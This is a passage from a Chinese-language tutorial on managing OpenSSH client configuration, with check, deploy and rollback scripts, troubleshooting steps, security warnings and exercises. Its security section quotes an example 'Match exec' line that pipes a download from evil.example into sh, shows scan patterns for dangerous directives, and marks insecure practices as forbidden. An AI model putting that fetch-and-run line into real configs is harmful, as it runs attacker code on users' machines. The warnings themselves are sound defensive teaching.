                     "$alias" 'echo OK; id -un; hostname -s' 2>&1); then
            ok "$alias 連通 → $(tr '\n' ' ' <<<"$out")"
        else
            bad "$alias 連線失敗："
            sed 's/^/      /' <<<"$out"
            FAIL_CONN=1
        fi
    done < "$EXPECT_FILE"
else
    head1 "2. 連通測試（-n 已略過）"
fi

# --- 結果 -----------------------------------------------------------
head1 "結果"
if (( FAIL_CONF )); then printf '%s設定比對：不通過%s\n' "$RED" "$RST"
else                     printf '%s設定比對：通過%s\n'   "$GRN" "$RST"; fi
if (( DO_CONNECT )); then
    if (( FAIL_CONN )); then printf '%s連通測試：不通過%s\n' "$RED" "$RST"
    else                     printf '%s連通測試：通過%s\n'   "$GRN" "$RST"; fi
fi

(( FAIL_CONF )) && exit 1
(( FAIL_CONN )) && exit 2
exit 0
SCRIPT

sudo chmod 755 /usr/local/bin/ssh-config-check
```

```bash
# 建立期望值檔（★★★ 這份也應該進內部 repo，它是「規格」）
cat > ~/.ssh/expected-hosts.txt <<'EOF'
# 別名     hostname       user      port   proxyjump（無則填 -）
bastion    203.0.113.10   opsadmin  22022  -
web01      10.10.20.11    deploy    2222   bastion
web02      10.10.20.12    deploy    2222   bastion
db01       10.10.30.21    dbadmin   22     bastion
mon01      10.10.40.5     monitor   22     bastion
EOF
chmod 600 ~/.ssh/expected-hosts.txt

ssh-config-check
```

預期輸出（全部通過）：

```text
=== 0. 環境與權限 ===
  ✓ ssh OpenSSH_9.6p1 Ubuntu-3ubuntu13.5, OpenSSL 3.0.13 30 Jan 2024
  ✓ config 權限 600、擁有者 opsadmin
  ✓ 設定檔語法通過（ssh -G 完整解析成功）

=== 1. 設定解析比對（ssh -G） ===
  ✓ bastion → opsadmin@203.0.113.10:22022 (jump=-)
  ✓ web01 → deploy@10.10.20.11:2222 (jump=bastion)
  ✓ web02 → deploy@10.10.20.12:2222 (jump=bastion)
  ✓ db01 → dbadmin@10.10.30.21:22 (jump=bastion)
  ✓ mon01 → monitor@10.10.40.5:22 (jump=bastion)

=== 2. 連通測試（BatchMode，不會互動、不會問密碼） ===
  ✓ bastion 連通 → OK opsadmin bastion
  ✓ web01 連通 → OK deploy web01
  ✓ web02 連通 → OK deploy web02
  ✓ db01 連通 → OK dbadmin db01
  ✓ mon01 連通 → OK monitor mon01

=== 結果 ===
設定比對：通過
連通測試：通過
```

把 `90-defaults.conf` 改名成 `01-defaults.conf`（**製造本篇最大的坑**）之後：

```text
=== 1. 設定解析比對（ssh -G） ===
  ! 第一個套用的區塊就是 Host *（若它設了 User/IdentityFile 會鎖死所有主機）
  ✗ web01 設定不符：
      user: 期望 deploy 實得 opsadmin
      提示：跑 ssh -vvv web01 true 2>&1 | grep "Applying options"
            看哪個區塊【先】被套用 —— 第一個值勝出。
```

### ★★★ 安全的部署與回滾

```bash
sudo tee /usr/local/bin/ssh-config-deploy >/dev/null <<'SCRIPT'
#!/usr/bin/env bash
# ssh-config-deploy — 從內部 repo 更新 config.d，驗證失敗自動回滾
set -euo pipefail

REPO="${1:-$HOME/repos/ssh-config}"
DEST="$HOME/.ssh/config.d"
STAMP=$(date +%F-%H%M%S)
BACKUP="$HOME/.ssh/backup/config.d-$STAMP"

[[ -d "$REPO" ]] || { echo "找不到 repo：$REPO" >&2; exit 3; }

echo "[1/5] 備份現有設定 → $BACKUP"
mkdir -p "$HOME/.ssh/backup"
cp -a "$DEST" "$BACKUP"

echo "[2/5] 更新 repo"
git -C "$REPO" pull --ff-only

echo "[3/5] 套用（★★★ 保留不進 repo 的 80-local.conf）"
rsync -a --delete --exclude='80-local.conf' --exclude='*.local.conf' \
      "$REPO"/config.d/ "$DEST"/
chmod 700 "$DEST"; chmod 600 "$DEST"/*.conf

echo "[4/5] 清除 ControlMaster socket（★★★★ 否則新設定不會生效）"
find "$HOME/.ssh/cm" -type s -delete 2>/dev/null || true

echo "[5/5] 驗證"
if ssh-config-check -n; then
    echo "★ 部署成功。備份保留於 $BACKUP"
    exit 0
else
    echo "★★★★ 驗證失敗，自動回滾中……" >&2
    rm -rf "$DEST"
    cp -a "$BACKUP" "$DEST"
    echo "★★★ 已回滾到 $BACKUP 的內容。請檢查 repo 內容後重試。" >&2
    exit 1
fi
SCRIPT
sudo chmod 755 /usr/local/bin/ssh-config-deploy
```

```bash
ssh-config-deploy ~/repos/ssh-config
```

預期輸出：

```text
[1/5] 備份現有設定 → /home/opsadmin/.ssh/backup/config.d-2026-08-28-091233
[2/5] 更新 repo
Already up to date.
[3/5] 套用（★★★ 保留不進 repo 的 80-local.conf）
[4/5] 清除 ControlMaster socket（★★★★ 否則新設定不會生效）
[5/5] 驗證
  ✓ web01 → deploy@10.10.20.11:2222 (jump=bastion)
  ...
★ 部署成功。備份保留於 /home/opsadmin/.ssh/backup/config.d-2026-08-28-091233
```

### 驗收檢查表

| # | 檢查項 | 指令 | 預期結果 | 星級 |
| --- | --- | --- | --- | --- |
| 1 | config 權限正確 | `stat -c '%a %U' ~/.ssh/config` | `600 <你的帳號>` | ★★★★ |
| 2 | 目錄權限正確 | `stat -c '%a' ~/.ssh ~/.ssh/config.d ~/.ssh/cm` | 三個都是 `700` | ★★★ |
| 3 | 語法無誤 | `ssh -G bastion >/dev/null; echo $?` | `0` | ★★★★ |
| 4 | **Host \* 排最後** | `ssh -vvv -o ConnectTimeout=1 x true 2>&1 \| grep -c 'Applying options'` | 最後一個才是 `for *` | ★★★★★ |
| 5 | 每個別名解析正確 | `ssh-config-check -n` | 「設定比對：通過」 | ★★★★ |
| 6 | 每台實際連得上 | `ssh-config-check` | 「連通測試：通過」 | ★★★★ |
| 7 | 私鑰**不在**跳板機 | `ssh bastion 'ls ~/.ssh/id_* 2>/dev/null \| wc -l'` | `0` | ★★★★★ |
| 8 | 主機驗證沒被關掉 | `ssh -G web01 \| grep stricthostkeychecking` | `accept-new` 或 `ask`，**不是 `no`** | ★★★★★ |
| 9 | known_hosts 有內容 | `wc -l ~/.ssh/known_hosts` | `> 0`（**不是 /dev/null**） | ★★★★ |
| 10 | agent 轉發是關的 | `ssh -G web01 \| grep forwardagent` | `forwardagent no` | ★★★★ |
| 11 | 連線複用有效 | `ssh web01 true; ssh -O check web01` | `Master running (pid=...)` | ★★★ |
| 12 | 第二次連線變快 | `time ssh web01 true` | `real < 0.1s` | ★★ |
| 13 | 敏感檔沒進 repo | `git -C ~/repos/ssh-config ls-files \| grep -c 80-local` | `0` | ★★★★ |
| 14 | repo 裡沒有私鑰 | `git -C ~/repos/ssh-config grep -l 'PRIVATE KEY'` | 無輸出 | ★★★★★ |
| 15 | 有回滾備份 | `ls ~/.ssh/backup/` | 至少一份 | ★★★ |

### 新同仁 10 分鐘上手包

```
★★★ 交接文件應該只有這三頁（見 [[03-技術文件撰寫實務]]）

┌─ 第 1 頁：拿到什麼 ────────────────────────────────────────┐
│ ① 內部 repo 網址：git@gitlab.internal:ops/ssh-config.git   │
│ ② 你的帳號：<姓名縮寫>，例如 chwang                        │
│ ③ ★★★★ 金鑰【你自己產生】，私鑰【絕不外流】，              │
│    只把公鑰（.pub）貼進申請單                              │
└────────────────────────────────────────────────────────────┘

┌─ 第 2 頁：五個指令 ────────────────────────────────────────┐
│ # 1. 產金鑰（細節見 [[02-SSH-金鑰認證與ssh-agent]]）        │
│ ssh-keygen -t ed25519 -C "chwang@agency" -f ~/.ssh/id_ed25519_prod │
│ ssh-keygen -t ed25519 -C "chwang@agency" -f ~/.ssh/id_ed25519_bastion │
│                                                            │
│ # 2. 把兩個 .pub 貼進申請單，等維運組佈署                   │
│ cat ~/.ssh/id_ed25519_prod.pub                             │
│                                                            │
│ # 3. 取得標準 config                                        │
│ git clone git@gitlab.internal:ops/ssh-config.git ~/repos/ssh-config │
│ ssh-config-deploy ~/repos/ssh-config                       │
│                                                            │
│ # 4. 驗收                                                   │
│ ssh-config-check                                           │
│                                                            │
│ # 5. 連線                                                   │
│ ssh web01                                                  │
└────────────────────────────────────────────────────────────┘

┌─ 第 3 頁：三條紅線 ────────────────────────────────────────┐
│ ★★★★★ ① 私鑰【永遠】不離開你的筆電。                       │
│         看到有人 scp 私鑰到伺服器，立刻通報。               │
│ ★★★★★ ② 【禁止】在 config 寫 StrictHostKeyChecking no。    │
│         那等於關掉中間人攻擊的唯一防線。                    │
│ ★★★★  ③ 【禁止】在 Host * 區塊寫 User / IdentityFile。     │
│         第一個值勝出 —— 會鎖死所有主機的設定。              │
│                                                            │
│ 遇到問題的第一個指令永遠是：ssh -G <別名>                   │
│ 第二個是：ssh -O exit <別名>                                │
│ 第三個是：ssh -vvv <別名> true 2>&1 | grep 'Applying'       │
└────────────────────────────────────────────────────────────┘
```

---

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| **改了 `User` 卻沒生效，`ssh -G` 也顯示舊值** ★★★★★ | **`Host *` 排在前面**，第一個值勝出 | 把 `Host *` 移到檔案**最後**；用 `ssh -vvv \| grep 'Applying options'` 確認順序 |
| **`ssh -G` 顯示新值，但實際連進去還是舊行為** ★★★★ | **ControlPersist 的舊 socket 還活著** | `ssh -O exit <別名>`；或 `rm -f ~/.ssh/cm/*` |
| `Bad owner or permissions on ~/.ssh/config` ★★★★ | 檔案 group/other 可寫，或 owner 不是自己（常見於 `sudo vim`） | `sudo chown $USER:$USER ~/.ssh/config && chmod 600 ~/.ssh/config` |
| **`terminating, 1 bad configuration options`，所有 ssh／git／rsync 全掛** ★★★★ | config 裡有拼錯的關鍵字 | 依錯誤訊息的行號改；改完跑 `ssh -G <任意別名>` 確認 |
| `Too many authentication failures` ★★★★ | agent 裡金鑰太多，超過伺服器 `MaxAuthTries` | 該 Host 區塊加 `IdentitiesOnly yes` + 明確 `IdentityFile` |
| **`ssh -G` 的 `hostname` 等於你打的別名** ★★★★ | **沒有任何 `Host` 區塊匹配到**（拼字、大小寫、多餘空白） | 檢查別名拼字；`ssh -vvv` 看有沒有 `Applying options for <別名>` |
| `ControlPath too long ('...' >= 108 bytes)` ★★★ | UNIX socket 路徑上限 108 bytes | `ControlPath ~/.ssh/cm/%C`（用雜湊，固定長度） |
| `Control socket connect(...): No such file or directory` ★★ | master 沒在跑（正常現象） | 無需處理；`ssh <別名>` 會自動建立新的 master |
| **`ControlSocket ... already exists, disabling multiplexing`** ★★★ | 上次 ssh 被 kill -9，socket 檔沒清掉 | `rm -f ~/.ssh/cm/<那個檔>`；改用 `%C` 避免衝突 |
| **`Match host 10.10.*` 完全不生效** ★★★ | 該別名的 `HostName` 還沒被設定，`%h` 仍是別名 | 確認 `Match` 排在設定 `HostName` 的 `Host` 區塊**之後**；或改用 `Match final host` |
| 連線閒置 5 分鐘就 `packet_write_wait: Broken pipe` ★★★ | 機關 NAT／狀態防火牆清掉閒置連線 | `Host *` 加 `ServerAliveInterval 30` / `ServerAliveCountMax 3` |
| **`ssh -J` 連得上但 `ssh <別名>` 連不上** ★★★ | `ProxyJump` 指的別名在 config 裡不存在，或排在後面沒被讀到 | `ssh -G <別名> \| grep proxyjump` 確認值；再 `ssh -G <跳板別名>` 確認跳板本身解析正確 |
| **`Permission denied (publickey)`，但金鑰百分之百正確** ★★★★ | 走到的是 ControlMaster 舊連線，或 `IdentityFile` 路徑打錯（ssh **不會**因為檔案不存在而報錯） | `ssh -O exit`；`ssh -G x \| grep identityfile` 後 `ls -l` 確認檔案真的存在 |
| **`REMOTE HOST IDENTIFICATION HAS CHANGED!`** ★★★★★ | 主機金鑰變了：重灌／換機／**或中間人攻擊** | **★★★★★ 先確認是不是自己重灌的**；是才 `ssh-keygen -R <host>`；不是就立刻通報資安 |
| WSL 裡連不上但 Windows 裡可以 ★★★ | 兩套 OpenSSH、兩份 config，完全獨立 | 在 WSL 裡也放一份；或用同一個內部 repo 同步 |
| VS Code Remote-SSH 顯示看不懂的錯誤 ★★★ | 底層就是 ssh，只是錯誤訊息被吞掉 | 回終端機跑 `ssh -G <別名>` 與 `ssh -vvv <別名>`，訊息清楚得多 |

### 排查步驟

**【1】★★★★ 先看設定，不要先連線**

```bash
ssh -G web01 | awk '$1 ~ /^(hostname|user|port|proxyjump|identityfile|controlpath)$/'
```

```text
user deploy
hostname 10.10.20.11
port 2222
controlpath /home/opsadmin/.ssh/cm/870b88d7...
identityfile ~/.ssh/id_ed25519_prod
proxyjump bastion
```

```
★★★★ 判讀：
  · hostname == web01（等於別名）→ 【問題在 Host 匹配】，跳【2】
  · user / port 跟你寫的不一樣    → 【問題在區塊順序】，跳【3】
  · 完全沒有輸出、跳出 Bad configuration option → 【語法錯】，看錯誤行號直接改
```

**【2】★★★ 確認哪些區塊被套用、順序如何**

```bash
ssh -vvv -o ConnectTimeout=1 web01 true 2>&1 | grep -E 'Reading configuration|Including file|Applying options'
```

```text
debug1: Reading configuration data /home/opsadmin/.ssh/config
debug3: ... Including file /home/opsadmin/.ssh/config.d/10-bastion.conf depth 0
debug3: ... Including file /home/opsadmin/.ssh/config.d/20-prod.conf depth 0
debug1: /home/opsadmin/.ssh/config.d/20-prod.conf line 8: Applying options for web01
debug1: /home/opsadmin/.ssh/config.d/90-defaults.conf line 6: Applying options for *
```

```
★★★★ 判讀：
  · 完全沒有「Applying options for web01」→ 別名拼錯／大小寫錯／該檔沒被 Include
  · 「Applying options for *」出現在【web01 之前】→ ★★★★★ 就是本篇最大的坑，
     Host * 排太前面。把它的檔名前綴改成 90- 或直接搬到檔案最後。
  · Including file 沒列出你以為會載入的檔 → glob 沒對上（副檔名不是 .conf？路徑錯？）
```

**【3】★★★★ 排除 ControlMaster 干擾（改設定沒反應時的必做步驟）**

```bash
ssh -O check web01
```

```text
Master running (pid=48213)          # ★★★★ 有 master → 你的新設定不會生效
```

```bash
ssh -O exit web01
ls -l ~/.ssh/cm/
```

```text
Exit request sent.
total 0                              # ★★★ 乾淨了，現在重連才會用新設定
```

```
★★★ 如果 -O check 回「No such file or directory」，代表本來就沒有 master，
    問題不在這裡，繼續往下。
```

**【4】★★★ 驗證跳板機那一段單獨可行**

```bash
ssh -o BatchMode=yes -o ConnectTimeout=5 bastion 'hostname -s; id -un'
```

```text
bastion
opsadmin
```

```
★★★★ 判讀：
  · 這一步就失敗 → 問題在【跳板機】，跟目標主機無關。
    往下查跳板機的 port、防火牆（[[02-防火牆-ufw基礎與實務]]）、金鑰授權。
  · 這一步成功但 ssh web01 失敗 → 問題在【第二跳】，跳【5】
```

**【5】★★★ 在跳板機上驗證第二跳的網路可達性**

```bash
ssh bastion 'timeout 5 bash -c "cat < /dev/null > /dev/tcp/10.10.20.11/2222" && echo REACHABLE || echo BLOCKED'
```

```text
REACHABLE
```

```
★★★★ 判讀：
  · BLOCKED → 跳板機到目標的【路由或防火牆】問題，不是 ssh 設定問題。
    ★★★ 這一步能省下大量猜測 —— 把「ssh 問題」跟「網路問題」切開。
  · REACHABLE 但 ssh web01 仍失敗 → 是【認證】問題，跳【6】
```

**【6】★★★★ 認證失敗：看到底送出了哪把金鑰**

```bash
ssh -vv web01 2>&1 | grep -E 'Offering|Authentications that can continue|Server accepts key|Trying private key'
```

```text
debug1: Authentications that can continue: publickey
debug1: Offering public key: /home/opsadmin/.ssh/id_ed25519_prod ED25519 SHA256:dddd...
debug1: Server accepts key: /home/opsadmin/.ssh/id_ed25519_prod ED25519 SHA256:dddd...
```

```
★★★★ 判讀：
  · 只 Offering 了一把且被 accept → 認證沒問題，往下看 Permission denied 的其他原因
    （★★★ 帳號被鎖、shell 是 /sbin/nologin、AllowUsers 沒放行 —— 見 [[04-sshd-伺服器端設定]]）
  · Offering 了一長串（3 把以上） → ★★★★ 缺 IdentitiesOnly yes，
    可能撞到伺服器的 MaxAuthTries 被踢掉
  · 一把都沒 Offering → IdentityFile 路徑不存在（★★★ ssh 不會為此報錯，
    它只是安靜地跳過），用 ls -l 確認檔案真的在
```

**【7】★★★ 確認金鑰檔真的存在（ssh 不會告訴你）**

```bash
ssh -G web01 | awk '$1=="identityfile"{print $2}' | while read -r f; do
    p="${f/#\~/$HOME}"
    if [ -f "$p" ]; then echo "OK   $p"; else echo "MISS $p"; fi
done
```

```text
MISS /home/opsadmin/.ssh/id_rsa
MISS /home/opsadmin/.ssh/id_ecdsa
MISS /home/opsadmin/.ssh/id_ed25519
OK   /home/opsadmin/.ssh/id_ed25519_prod     # ★★★ 只要你指定的那把在就行
```

```
★★★★ 判讀：如果連你在 config 裡明確指定的那把都是 MISS，
      就是路徑打錯（★★★ 最常見：寫成 ~/ssh/ 少了那個點，或 _prod 寫成 -prod）。
```

**【8】★★ 用一個完全乾淨的環境交叉驗證**

```bash
# ★★★ 只用命令列參數，完全不讀任何 config（-F /dev/null）
ssh -F /dev/null \
    -o IdentitiesOnly=yes \
    -o IdentityFile=~/.ssh/id_ed25519_prod \
    -o ProxyJump=opsadmin@203.0.113.10:22022 \
    -o ConnectTimeout=5 \
    -p 2222 deploy@10.10.20.11 'hostname -s'
```

```text
web01
```

```
★★★★ 這是最強的分界線：
  · 這樣可以連上 → 【問題 100% 在 config】，回【1】重新比對
  · 這樣也連不上 → 【問題在網路／伺服器／金鑰授權】，config 是清白的，
    往 [[04-sshd-伺服器端設定]] 與 [[02-SSH-金鑰認證與ssh-agent]] 查
```

---

## 安全性注意事項

> [!danger] 絕對禁止的四件事 ★★★★★
> ```
> ① ★★★★★ 把私鑰複製到跳板機或任何伺服器上
>    $ scp ~/.ssh/id_ed25519_prod bastion:~/.ssh/     ← ★★★★★ 這是資安事件
>
>    後果：跳板機是對外開放、被掃描最頻繁的機器。一旦被入侵，
>          攻擊者拿到的不是一台機器，是【內網所有機器的鑰匙】。
>    正解：ProxyJump —— 認證永遠在你的筆電上做（見上方 ASCII 圖）。
>
> ② ★★★★★ StrictHostKeyChecking no + UserKnownHostsFile /dev/null
>
>    後果：中間人可以冒充任何一台伺服器，完整看到你輸入的
>          sudo 密碼、DB 密碼、API token，而且【事後查不出來】。
>          ★★★★ 對機關而言這是「稽核軌跡不完整」，資安稽核直接失分。
>    正解：StrictHostKeyChecking accept-new。
>
> ③ ★★★★★ 把 ~/.ssh/config、known_hosts、私鑰推到【公開】repo
>    $ git add ~/.ssh/            ← ★★★★★ 停
>
>    後果：config 裡的跳板機外網 IP + 非標準 port + 有效帳號名，
>          是攻擊者最想要的三件套。GitHub 上有專門的爬蟲在找這個。
>    正解：只推 config.d 的非敏感部分到【私有】repo，
>          .gitignore 排除 80-local.conf、id_*、known_hosts。
>
> ④ ★★★★ ForwardAgent yes 寫在 Host *
>
>    後果：你連上的【每一台】機器上的 root，都能透過
>          $SSH_AUTH_SOCK 用你的身分簽章，橫向移動到你有權限的所有機器。
>          ★★★★ 這叫 agent hijacking，是紅隊最愛的手法之一。
>    正解：預設 no。真的需要（例如在伺服器上 git clone）就改用
>          ProxyJump + 本機操作，或該次連線單獨加 -A。
> ```

> [!warning] 機關情境的四個額外要求 ★★★
> ```
> ① ★★★★ 【一人一帳號，不共用】
>    Host * 寫 User root 等於全部稽核紀錄都變成 root，
>    出事時無法追溯是誰做的。config 裡的 User 應該是【個人帳號】，
>    需要提權時在伺服器上用 sudo（sudo 有完整 log）。
>
> ② ★★★ 【config 是資產清冊，異動要留紀錄】
>    把 config.d 放進內部 git repo，每次異動都有 commit 訊息與審核人，
>    這同時滿足「組態管理」與「變更管理」兩項稽核要求。
>    ★★ 見 [[02-Git-基本工作流程]]。
>
> ③ ★★★★ 【離職／調職的金鑰回收】
>    config 裡的 IdentityFile 命名要能對應到「誰的哪把鑰匙」，
>    人員異動時才知道要去伺服器的 authorized_keys 刪哪幾行。
>    ★★★ 更好的做法是改用 SSH 憑證（有效期自動過期），見 [[07-SSH-安全強化]]。
>
> ④ ★★★ 【最小權限】
>    db01 用 dbadmin、mon01 用 monitor，不要一個 deploy 打天下。
>    config 裡把它寫清楚，本身就是最小權限政策的落實與文件。
> ```

> [!warning] `Match exec` 與 `Include` 的信任邊界 ★★★★
> ```
> ★★★★★ Include 進來的檔案 = 你把 shell 執行權交給那個檔案的作者。
>
>   Match exec "curl -s http://evil.example/x | sh"
>       ProxyJump none
>
> ★★★★ 這行放在任何被 Include 的檔案裡，只要你下一次 ssh（甚至 ssh -G），
>       它就會執行。而 git pull 下來的 config 你通常不會逐行看。
>
> ★★★ 防護：
>   ① config repo 一律開 protected branch + 強制 review
>   ② ssh-config-deploy 部署前掃描：
>      $ grep -rn 'Match exec\|LocalCommand\|PermitLocalCommand\|ProxyCommand' ~/repos/ssh-config/
>      → ★★★ 有輸出就人工檢視，這幾個關鍵字都能執行本機指令
>   ③ ★★ 絕不 Include 網路上抄來的 config
> ```

```bash
# ★★★ 部署前的敏感內容掃描（可以放進 CI 或 pre-commit hook）
grep -rnE 'PRIVATE KEY|StrictHostKeyChecking[[:space:]]+no|UserKnownHostsFile[[:space:]]+/dev/null|ForwardAgent[[:space:]]+yes|Match exec|LocalCommand' \
     ~/repos/ssh-config/ && echo "★★★★ 發現高風險設定，禁止合併" || echo "★ 掃描通過"
```

預期輸出（乾淨時）：

```text
★ 掃描通過
```

---

## 速查表

### 第一動作（★★★★ 背起來）

| 情境 | 指令 | 星級 |
| --- | --- | --- |
| 任何 config 問題 | `ssh -G <別名>` | ★★★★★ |
| 改了設定沒反應 | `ssh -O exit <別名>` | ★★★★ |
| 想知道為什麼是這個值 | `ssh -vvv <別名> true 2>&1 \| grep 'Applying options'` | ★★★★ |
| 語法檢查 | `ssh -G x >/dev/null && echo OK` | ★★★★ |
| 完全繞過 config 交叉驗證 | `ssh -F /dev/null -o ... user@host` | ★★★ |
| 比較兩台的設定差異 | `diff <(ssh -G a) <(ssh -G b)` | ★★★ |

### 解析規則

| 規則 | 內容 | 星級 |
| --- | --- | --- |
| **第一個值勝出** | 參數第一次被設定後鎖死，後面無效 | ★★★★★ |
| **`Host *` 放最後** | 放前面會鎖死所有具體主機的設定 | ★★★★★ |
| 優先序 | 命令列 `-o` > `~/.ssh/config` > `/etc/ssh/ssh_config` | ★★★★ |
| `Host` 比對對象 | **originalhost**（命令列打的字串） | ★★★★ |
| `Match host` 比對對象 | 解析後的 **HostName** | ★★★ |
| `Include` 展開位置 | 就是那一行的位置，glob 依字典序 | ★★★ |
| 縮排 | **純裝飾，沒有語意** —— 區塊靠 `Host`/`Match` 分界 | ★★ |
| 關鍵字大小寫 | 不分（`hostname` = `HostName`）；**參數值分大小寫** | ★★ |

### 必設的設定項

| 設定項 | 建議值 | 為什麼 | 星級 |
| --- | --- | --- | --- |
| `IdentitiesOnly` | `yes` | 避免 `Too many authentication failures` | ★★★★ |
| `StrictHostKeyChecking` | `accept-new` | **不要 `no`** | ★★★★★ |
| `ForwardAgent` | `no` | 防 agent hijacking | ★★★★ |
| `ServerAliveInterval` | `30` | NAT／防火牆閒置斷線 | ★★★★ |
| `ServerAliveCountMax` | `3` | 90 秒判定斷線 | ★★★ |
| `ControlPath` | `~/.ssh/cm/%C` | 避開 108 bytes 上限 | ★★★★ |
| `ControlPersist` | `10m` | 太長會讓舊設定黏太久 | ★★★ |
| `ConnectTimeout` | `10` | 腳本不卡死 | ★★★ |
| `AddKeysToAgent` | `yes` | 一天只輸入一次 passphrase | ★★ |

### `ssh -O` 與 ControlMaster

| 指令 | 作用 | 星級 |
| --- | --- | --- |
| `ssh -O check <別名>` | `Master running (pid=N)` 或 socket 不存在 | ★★★ |
| `ssh -O exit <別名>` | **關閉 master 與所有複用工作階段** | ★★★★ |
| `ssh -O stop <別名>` | 停收新的複用，現有的保留 | ★★ |
| `ls -l ~/.ssh/cm/` | 列出所有存活的 socket | ★★★ |
| `rm -f ~/.ssh/cm/*` | 暴力清除（**★★ 會踢掉現有工作階段**） | ★★ |

### Token

| Token | 展開為 | 星級 |
| --- | --- | --- |
| `%h` | HostName（解析後） | ★★★ |
| `%n` | originalhost（你打的別名） | ★★ |
| `%p` | Port | ★★★ |
| `%r` | 遠端使用者 | ★★ |
| `%u` / `%i` | 本機使用者名 / UID | ★★ |
| `%C` | `%l%h%p%r%j` 的雜湊，**固定 40 字元** | ★★★★ |
| `%d` | 本機家目錄 | ★★ |

### 檔案與路徑

| 路徑 | 用途 | 建議權限 | 星級 |
| --- | --- | --- | --- |
| `~/.ssh/` | 全部 | `700` | ★★★★ |
| `~/.ssh/config` | 主設定 | `600` | ★★★★ |
| `~/.ssh/config.d/*.conf` | 分檔 | `600` | ★★★ |
| `~/.ssh/cm/` | ControlMaster socket | `700` | ★★★★ |
| `~/.ssh/known_hosts` | 主機金鑰 | `600` | ★★★ |
| `/etc/ssh/ssh_config` | 全機器共用 | `644` | ★★ |
| `/etc/ssh/ssh_config.d/*.conf` | **系統層 include（先於主檔）** | `644` | ★★★ |
| `C:\Users\<你>\.ssh\config` | Windows 內建 OpenSSH | `icacls` 限本人 | ★★★ |

### 版本需求

| 功能 | 最低 OpenSSH | 星級 |
| --- | --- | --- |
| `%C` token | 6.7（2014） | ★★★ |
| `AddKeysToAgent` | 7.2（2016） | ★★ |
| **`ProxyJump` / `-J`** | **7.3（2016）** | ★★★★ |
| **`Include`** | **7.3（2016）** | ★★★★ |
| **`StrictHostKeyChecking accept-new`** | **7.6（2017）** | ★★★★ |
| `Tag` / `Match tagged` | 9.4（2023） | ★★★ |

---

## 練習題

> [!question]- 練習 1：找出「設定沒生效」的原因並修好
> **題目**：同仁回報「我在 config 裡寫了 `User deploy`，但連上去永遠是 root」。
> 他的 `~/.ssh/config` 如下，請找出原因並修正。
>
> ```text
> Host *
>     User root
>     StrictHostKeyChecking no
>     ControlMaster auto
>     ControlPath ~/.ssh/cm/%C
>     ControlPersist 8h
>
> Host web01
>     HostName 10.10.20.11
>     User deploy
>     Port 2222
> ```
>
> ---
> **參考解答**
>
> **診斷：**
> ```bash
> ssh -G web01 | grep -E '^(user|hostname|port)'
> ```
> ```text
> user root                 # ★★★★★ 這就是證據
> hostname 10.10.20.11
> port 2222
> ```
>
> **兩個問題：**
>
> **① ★★★★★ `Host *` 放在最前面。** ssh_config 是「第一個值勝出」，
> `Host *` 的 `User root` 先被套用，`Host web01` 的 `User deploy` 完全無效。
> 注意 `HostName` 與 `Port` **有**生效 —— 因為 `Host *` 沒設這兩個。
> 這個「有些生效有些不生效」的現象最容易讓人誤判。
>
> **② ★★★★ `StrictHostKeyChecking no`** 把主機驗證整個關掉，必須移除。
> 另外 `ControlPersist 8h` 太長，改完 config 後舊 socket 會黏一整天。
>
> **修正後：**
> ```text
> Host web01
>     HostName 10.10.20.11
>     User deploy
>     Port 2222
>
> Host *
>     StrictHostKeyChecking accept-new
>     UserKnownHostsFile ~/.ssh/known_hosts
>     ControlMaster auto
>     ControlPath ~/.ssh/cm/%C
>     ControlPersist 10m
> ```
>
> **★★★★ 改完必做（否則你會以為沒改成功）：**
> ```bash
> ssh -O exit web01          # 殺掉用舊 User 建立的 master
> ssh -G web01 | grep '^user '
> ```
> ```text
> Exit request sent.
> user deploy                # ★★★★ 現在對了
> ```

> [!question]- 練習 2：寫出三層跳板的 config 並驗證
> **題目**：你在家用 VPN 連進機關的 DMZ 跳板機 `bastion-dmz`（`203.0.113.10:22022`，
> 帳號 `opsadmin`），從那裡才能到內網跳板 `bastion-int`（`10.10.1.5:22`，帳號 `opsadmin`），
> 再從內網跳板連 `db01`（`10.10.30.21:22`，帳號 `dbadmin`）。
> 寫出 config，並且要能在本機用 `mysql -h 127.0.0.1 -P 13306` 連到 db01 的 MySQL。
>
> ---
> **參考解答**
>
> ```text
> # ---- 跳板鏈 ----
> Host bastion-dmz
>     HostName 203.0.113.10
>     User opsadmin
>     Port 22022
>     IdentityFile ~/.ssh/id_ed25519_bastion
>     IdentitiesOnly yes
>
> Host bastion-int
>     HostName 10.10.1.5
>     User opsadmin
>     ProxyJump bastion-dmz          # ★★★ 內網跳板本身也要經過 DMZ 跳板
>     IdentityFile ~/.ssh/id_ed25519_bastion
>     IdentitiesOnly yes
>
> # ---- 目標 ----
> Host db01
>     HostName 10.10.30.21
>     User dbadmin
>     ProxyJump bastion-int          # ★★★★ 只要指最後一跳，鏈是遞迴解析的
>     IdentityFile ~/.ssh/id_ed25519_prod
>     IdentitiesOnly yes
>     LocalForward 13306 127.0.0.1:3306
>
> Host *
>     StrictHostKeyChecking accept-new
>     ServerAliveInterval 30
>     ControlMaster auto
>     ControlPath ~/.ssh/cm/%C
>     ControlPersist 10m
> ```
>
> **★★★ 關鍵觀念**：`ProxyJump bastion-int` 只寫**一層**就好。
> ssh 解析 `bastion-int` 時會發現它自己也有 `ProxyJump bastion-dmz`，
> 於是自動遞迴建立整條鏈。**不需要**寫 `ProxyJump bastion-dmz,bastion-int`。
>
> **驗證：**
> ```bash
> ssh -G db01 | grep -E '^(hostname|user|proxyjump|localforward)'
> ```
> ```text
> user dbadmin
> hostname 10.10.30.21
> localforward 13306 127.0.0.1:3306
> proxyjump bastion-int
> ```
> ```bash
> ssh -o BatchMode=yes db01 'hostname -s'
> ```
> ```text
> db01
> ```
> ```bash
> # ★★★ 隧道測試：先在背景連著，再從另一個終端測
> ssh -f -N db01
> ss -lnt | grep 13306
> ```
> ```text
> LISTEN 0  128  127.0.0.1:13306  0.0.0.0:*
> ```
>
> **★★★ 私鑰檢查（本題的重點）：**
> ```bash
> ssh bastion-dmz 'ls ~/.ssh/id_* 2>/dev/null | wc -l'
> ssh bastion-int 'ls ~/.ssh/id_* 2>/dev/null | wc -l'
> ```
> ```text
> 0
> 0                          # ★★★★★ 兩台跳板機上都不該有任何私鑰
> ```

> [!question]- 練習 3：把 config 拆檔並設計 .gitignore
> **題目**：把練習 2 的 config 拆成 `config.d/` 分檔，決定哪些進內部 repo、
> 哪些不進，並寫出 `.gitignore` 與一個 pre-commit 檢查。
>
> ---
> **參考解答**
>
> **檔案切分：**
>
